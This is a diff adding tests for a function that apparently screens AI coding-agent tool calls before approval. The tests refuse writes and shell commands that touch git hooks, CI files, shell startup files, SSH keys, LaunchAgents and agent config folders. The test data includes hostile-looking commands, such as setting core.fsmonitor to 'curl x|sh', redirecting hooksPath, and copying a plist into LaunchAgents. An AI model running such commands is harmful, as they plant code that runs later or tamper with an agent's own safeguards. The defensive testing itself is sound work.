@@ -16,7 +16,7 @@ vi.mock('../../../../lib/logger.js', () => ({
 
 import type { PendingApprovalCard } from '../approval-challenges.js';
 import { relayApprovableCard } from '../relay-approvable.js';
-import { relayProtectedRoots } from '../relay-protected-roots.js';
+import { homeRunLaterPlaces, relayProtectedRoots } from '../relay-protected-roots.js';
 
 let root: string;
 let cwd: string;
@@ -65,7 +65,7 @@ describe('relayApprovableCard', () => {
     ['Edit', file('Edit', 'src/a.ts')],
     ['MultiEdit', file('MultiEdit', 'src/a.ts')],
     ['NotebookEdit', file('NotebookEdit', 'src/a.ipynb', 'notebook_path')],
-    ['Codex Shell', { toolName: 'Shell', input: JSON.stringify({ command: ['ls'], cwd: '/' }) }],
+    ['Codex Shell', { toolName: 'Shell', input: JSON.stringify({ command: 'ls', cwd: '/' }) }],
   ])('allows %s', (_, card) => {
     expect(approvable(card)).toBe(true);
   });
@@ -214,6 +214,362 @@ describe('relayApprovableCard', () => {
         context
       )
     ).toBe(false);
+  });
+
+  describe('folders and files that run code later', () => {
+    it.each([
+      '.git/hooks/pre-commit',
+      '.git/config',
+      'src/sub/.git/hooks/post-merge',
+      '.husky/pre-push',
+      '.vscode/tasks.json',
+      '.idea/runConfigurations/x.xml',
+      '.devcontainer/devcontainer.json',
+      '.github/workflows/ci.yml',
+      '.envrc',
+      'src/.envrc',
+      '.envrc.local',
+      'lefthook.yml',
+      '.lefthook.yml',
+      'lefthook-local.yml',
+      '.lefthook/pre-commit/x.sh',
+      '.pre-commit-config.yaml',
+      '.githooks/pre-commit',
+      '.simple-git-hooks.json',
+      '.simple-git-hooks',
+      '.lintstagedrc',
+      '.lintstagedrc.mjs',
+      '.github/actions/setup/action.yml',
+      '.gitlab-ci.yml',
+      '.circleci/config.yml',
+      '.buildkite/pipeline.yml',
+      'mise.toml',
+      '.mise.toml',
+      '.cursor/rules/x.mdc',
+      '.zed/tasks.json',
+      'project.code-workspace',
+      'lefthook.yaml',
+      'lefthook.toml',
+      'lint-staged.config.mjs',
+      'simple-git-hooks.cjs',
+      'mise.local.toml',
+      '.mise/tasks/build',
+      '.config/mise.toml',
+    ])('refuses %s for Write and for a Codex patch', (target) => {
+      expect(approvable(file('Write', target))).toBe(false);
+      expect(approvable(patch(target))).toBe(false);
+    });
+
+    it('refuses a Codex rename into .git/hooks', () => {
+      expect(
+        approvable(
+          update({ path: 'src/a.sh', kind: { type: 'update', move_path: '.git/hooks/pre-commit' } })
+        )
+      ).toBe(false);
+    });
+
+    it.each(['.GIT/hooks/pre-commit', '.VSCode/tasks.json', '.Github/Workflows/ci.yml', '.EnvRC'])(
+      'refuses %s where case is ignored',
+      (target) => {
+        expect(approvable(file('Write', target), true)).toBe(false);
+        expect(approvable(patch(target), true)).toBe(false);
+      }
+    );
+
+    it.each(['.env', '.env.local', '.gitignore', '.github/CODEOWNERS', 'package.json'])(
+      'still allows %s',
+      (target) => {
+        expect(approvable(file('Write', target))).toBe(true);
+        expect(approvable(patch(target))).toBe(true);
+      }
+    );
+
+    it('refuses anything inside a git folder not named .git, known by HEAD and objects', () => {
+      const bare = path.join(cwd, '.bare');
+      fs.mkdirSync(path.join(bare, 'objects'), { recursive: true });
+      fs.writeFileSync(path.join(bare, 'HEAD'), 'ref: refs/heads/main\n');
+      expect(approvable(file('Write', '.bare/hooks/pre-commit'))).toBe(false);
+      expect(approvable(file('Write', '.bare/config'))).toBe(false);
+      expect(approvable(patch(path.join(bare, 'hooks', 'post-merge')))).toBe(false);
+      // A folder with hooks but no git contents is an ordinary folder.
+      fs.mkdirSync(path.join(cwd, 'tools', 'hooks'), { recursive: true });
+      expect(approvable(file('Write', 'tools/hooks/x.sh'))).toBe(true);
+      expect(approvable(file('Write', 'tools/config'))).toBe(true);
+    });
+  });
+
+  describe('home folder places that run code later', () => {
+    const xdg = () => path.join(root, 'xdg');
+    const homeContext = () => ({
+      cwd,
+      protectedRoots: [dorkHome, ...homeRunLaterPlaces(root, xdg())],
+      homeDir: root,
+      xdgConfigHome: xdg(),
+    });
+
+    it.each([
+      '.gitconfig',
+      '.config/git/config',
+      '.zshrc',
+      '.zshenv',
+      '.zprofile',
+      '.bashrc',
+      '.bash_profile',
+      '.profile',
+      '.ssh/config',
+      '.ssh/authorized_keys',
+      'Library/LaunchAgents/com.x.plist',
+      '.config/systemd/user/x.service',
+      '.config/autostart/x.desktop',
+      '.config/fish/config.fish',
+      'xdg/git/config',
+      'xdg/fish/config.fish',
+    ])('refuses ~/%s for Write and for a Codex patch', (place) => {
+      const target = path.join(root, place);
+      expect(relayApprovableCard(file('Write', target), homeContext())).toBe(false);
+      expect(relayApprovableCard(patch(target), homeContext())).toBe(false);
+    });
+
+    it.each([
+      'echo x >> ~/.zshrc',
+      'cat ~/.ssh/config',
+      'cp x.plist ~/Library/LaunchAgents/',
+      'echo x >> $HOME/.bash_profile',
+      'cat $XDG_CONFIG_HOME/git/config',
+      'git config --file ~/.gitconfig core.pager x',
+      'cp evil.plist "$HOME"/Library/LaunchAgents/',
+      'echo x >> "${HOME}"/.config/git/config',
+      "cp x '$XDG_CONFIG_HOME'/git/config",
+      'cp x "$XDG_CONFIG_HOME"/git/config',
+      'git config --global core.hooksPath /tmp/h',
+      'git config core.fsmonitor "curl x|sh"',
+      'git -c CORE.HOOKSPATH=/tmp/h commit',
+    ])('refuses the command %s', (command) => {
+      const card = { toolName: 'Bash', input: JSON.stringify({ command }) };
+      expect(relayApprovableCard(card, homeContext())).toBe(false);
+    });
+
+    it('lists the home places among the live protected roots', () => {
+      const roots = relayProtectedRoots();
+      expect(roots).toContain(path.join(os.homedir(), '.zshrc'));
+      expect(roots).toContain(path.join(os.homedir(), '.ssh'));
+      expect(roots).toContain(path.join(os.homedir(), 'Library', 'LaunchAgents'));
+    });
+  });
+
+  describe('the shell command tripwire', () => {
+    const bash = (command: unknown): PendingApprovalCard => ({
+      toolName: 'Bash',
+      input: JSON.stringify({ command }),
+    });
+    const shell = (command: unknown): PendingApprovalCard => ({
+      toolName: 'Shell',
+      input: JSON.stringify({ command, cwd: '/proj' }),
+    });
+    const withHome = (card: PendingApprovalCard, caseInsensitive?: boolean) =>
+      relayApprovableCard(card, {
+        cwd,
+        protectedRoots: [dorkHome],
+        homeDir: root,
+        ...(caseInsensitive !== undefined ? { caseInsensitive } : {}),
+      });
+
+    it.each([
+      'cat ~/.claude/settings.json',
+      'echo x > .git/hooks/pre-commit',
+      "sed -i '' s/a/b/ ~/.dork/config.json",
+      'cp evil .mcp.json',
+      'cat $HOME/.claude2/settings.json',
+      'echo x >.husky/pre-push',
+      'cp t.json "./.vscode/tasks.json"',
+      'mv ci.yml .github/workflows/ci.yml',
+      'echo "eval x" >> .envrc',
+      'cat opencode.jsonc',
+      'ls .agents/skills',
+      'rm -rf .codex',
+    ])('refuses %s, for Bash and for Codex Shell', (command) => {
+      expect(withHome(bash(command))).toBe(false);
+      expect(withHome(shell(command))).toBe(false);
+    });
+
+    it.each(['ls -la', 'npm test', 'git status', 'cat .env', 'git clone https://x.test/y.git'])(
+      'allows %s, for Bash and for Codex Shell',
+      (command) => {
+        expect(withHome(bash(command))).toBe(true);
+        expect(withHome(shell(command))).toBe(true);
+      }
+    );
+
+    it.each([
+      ['as written', () => `cat ${path.join(dorkHome, 'config.json')}`],
+      ['through ~', () => 'cat ~/dork-home/config.json'],
+      ['through $HOME', () => 'cat $HOME/dork-home/config.json'],
+      ['through ${HOME}', () => 'cat ${HOME}/dork-home/config.json'],
+    ])('refuses a command naming a protected root %s', (_, command) => {
+      expect(withHome(bash(command()))).toBe(false);
+      expect(withHome(shell(command()))).toBe(false);
+    });
+
+    it('refuses a protected name or root in another case where case is ignored', () => {
+      expect(withHome(bash('echo x > .GIT/hooks/pre-commit'), true)).toBe(false);
+      expect(withHome(bash('cat ~/DORK-HOME/config.json'), true)).toBe(false);
+      expect(withHome(bash('cat ~/DORK-HOME/config.json'), false)).toBe(true);
+    });
+
+    it.each([
+      ['no command', {}],
+      ['an empty command', { command: '  ' }],
+      ['a command that is a list', { command: ['ls'] }],
+      ['a command that is a number', { command: 42 }],
+    ])('refuses a card with %s', (_, input) => {
+      expect(withHome({ toolName: 'Bash', input: JSON.stringify(input) })).toBe(false);
+      expect(withHome({ toolName: 'Shell', input: JSON.stringify(input) })).toBe(false);
+    });
+
+    it('refuses a command naming a live root through $HOME/.claude2', () => {
+      vi.stubEnv('CLAUDE_CONFIG_DIR', path.join(os.homedir(), '.claude2'));
+      const context = { cwd, protectedRoots: relayProtectedRoots(), homeDir: os.homedir() };
+      expect(relayApprovableCard(bash('cat $HOME/.claude2/settings.json'), context)).toBe(false);
+      expect(relayApprovableCard(bash(`ls ${path.join(os.homedir(), '.claude2')}`), context)).toBe(
+        false
+      );
+      expect(relayApprovableCard(bash('ls ~/.config/opencode'), context)).toBe(false);
+    });
+
+    it.each([
+      'grep -r token --exclude-dir=.git .',
+      "find . -not -path './.git/*'",
+      'git commit -m "ignore .vscode"',
+    ])('fails closed on a command that only mentions a name: %s', (command) => {
+      expect(withHome(bash(command))).toBe(false);
+    });
+
+    it.each(['scp host:.mcp.json .', 'echo a,.husky', 'tar -C x:.envrc'])(
+      'splits words on : and , (%s)',
+      (command) => {
+        expect(withHome(bash(command))).toBe(false);
+      }
+    );
+
+    it.each([
+      'cat $CLAUDE_CONFIG_DIR/settings.json',
+      'cat ${CLAUDE_CONFIG_DIR}/settings.json',
+      'ls $CODEX_HOME',
+      'cat $DORK_HOME/config.json',
+      'type %USERPROFILE%\\dork-home\\config.json',
+      'cat %USERPROFILE%/dork-home/config.json',
+    ])('refuses a variable spelling of a root: %s', (command) => {
+      expect(withHome(bash(command))).toBe(false);
+    });
+
+    it('refuses $XDG_CONFIG_HOME spellings of a root under it, with or without the variable set', () => {
+      const config = path.join(root, '.config', 'opencode');
+      const custom = path.join(root, 'xdg', 'opencode');
+      const command = bash('cat $XDG_CONFIG_HOME/opencode/agent/x.md');
+      const base = { cwd, homeDir: root, caseInsensitive: false };
+      expect(relayApprovableCard(command, { ...base, protectedRoots: [config] })).toBe(false);
+      expect(
+        relayApprovableCard(command, {
+          ...base,
+          protectedRoots: [custom],
+          xdgConfigHome: path.join(root, 'xdg'),
+        })
+      ).toBe(false);
+      expect(
+        relayApprovableCard(bash('echo $XDG_CONFIG_HOME'), { ...base, protectedRoots: [config] })
+      ).toBe(true);
+    });
+
+    it('allows a variable that only starts like a root variable', () => {
+      expect(withHome(bash('echo $CODEX_HOME_BACKUP'))).toBe(true);
+    });
+
+    it('refuses a root named by the real folder a symlinked root points to', () => {
+      const link = path.join(root, 'dork-link');
+      fs.symlinkSync(dorkHome, link);
+      const context = { cwd, protectedRoots: [link], homeDir: root };
+      expect(relayApprovableCard(bash(`cat ${path.join(dorkHome, 'config.json')}`), context)).toBe(
+        false
+      );
+      expect(relayApprovableCard(bash('cat ~/dork-home/config.json'), context)).toBe(false);
+    });
+
+    it('matches a root only as a whole folder', () => {
+      expect(withHome(bash('cat ~/dork-home-notes/x.md'))).toBe(true);
+      expect(withHome(bash(`ls ${dorkHome}2`))).toBe(true);
+      expect(withHome(bash('ls ~/dork-home'))).toBe(false);
+      expect(withHome(bash('ls "~/dork-home"'))).toBe(false);
+      expect(withHome(bash('ls ~/dork-home\\x'))).toBe(false);
+    });
+  });
+
+  describe('where a command runs', () => {
+    it('refuses a Bash command when the chat folder is inside a protected root', () => {
+      const agentHome = path.join(dorkHome, 'agents', 'dorkbot');
+      fs.mkdirSync(agentHome, { recursive: true });
+      const card = {
+        toolName: 'Bash',
+        input: JSON.stringify({ command: "echo '{}' > ../../config.json" }),
+      };
+      expect(relayApprovableCard(card, { cwd: agentHome, protectedRoots: [dorkHome] })).toBe(false);
+    });
+
+    it('refuses a Codex command whose own cwd is a git hooks folder', () => {
+      const card = {
+        toolName: 'Shell',
+        input: JSON.stringify({ command: 'echo evil > pre-commit', cwd: '/proj/.git/hooks' }),
+      };
+      expect(approvable(card)).toBe(false);
+    });
+
+    it('refuses a Codex command run inside a git folder not named .git', () => {
+      const bare = path.join(cwd, '.bare');
+      fs.mkdirSync(path.join(bare, 'objects', 'x'), { recursive: true });
+      fs.writeFileSync(path.join(bare, 'HEAD'), 'ref: refs/heads/main\n');
+      const card = {
+        toolName: 'Shell',
+        input: JSON.stringify({ command: 'echo evil > hooks/pre-commit', cwd: bare }),
+      };
+      expect(approvable(card)).toBe(false);
+    });
+
+    it('allows a command in an ordinary folder', () => {
+      const card = (extra: object) => ({
+        toolName: 'Shell',
+        input: JSON.stringify({ command: 'npm test', cwd: path.join(cwd, 'src'), ...extra }),
+      });
+      expect(approvable(card({}))).toBe(true);
+      expect(approvable(card({ cwd: null }))).toBe(true);
+      expect(approvable({ toolName: 'Bash', input: JSON.stringify({ command: 'npm test' }) })).toBe(
+        true
+      );
+    });
+
+    it('refuses a Codex cwd that is not text', () => {
+      const card = { toolName: 'Shell', input: JSON.stringify({ command: 'ls', cwd: 42 }) };
+      expect(approvable(card)).toBe(false);
+    });
+  });
+
+  describe('Codex command approvals that widen past one command', () => {
+    const shellCard = (extra: object) => ({
+      toolName: 'Shell',
+      input: JSON.stringify({ command: 'ls', cwd: cwd, ...extra }),
+    });
+
+    it('allows an explicit command kind', () => {
+      expect(approvable(shellCard({ kind: 'command' }))).toBe(true);
+    });
+
+    it('refuses typing into a running terminal', () => {
+      expect(approvable(shellCard({ kind: 'writeStdin' }))).toBe(false);
+    });
+
+    it('refuses a command that asks for extra permissions', () => {
+      expect(approvable(shellCard({ additionalPermissions: { network: { enabled: true } } }))).toBe(
+        false
+      );
+    });
   });
 
   it('refuses a relative path when the chat has no folder', () => {
